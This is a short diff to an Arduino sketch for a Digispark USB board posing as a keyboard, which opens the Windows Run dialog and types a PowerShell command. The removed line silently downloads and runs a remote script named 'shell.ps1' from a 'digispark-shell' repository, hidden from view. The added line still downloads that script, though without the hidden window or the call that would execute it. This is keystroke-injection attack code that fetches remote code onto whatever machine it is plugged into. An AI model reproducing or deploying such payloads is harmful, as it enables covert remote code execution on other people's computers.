@@ -9,7 +9,7 @@ void setup()
     DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
     ledBlink(8);
 
-    DigiKeyboardPtBr.println(F("powershell -windowstyle hidden \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Louie-Cipher/digispark-shell/master/shell.ps1');\""));
+    DigiKeyboardPtBr.println("powershell (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Louie-Cipher/digispark-shell/master/shell.ps1')");
 }
 
 void loop()
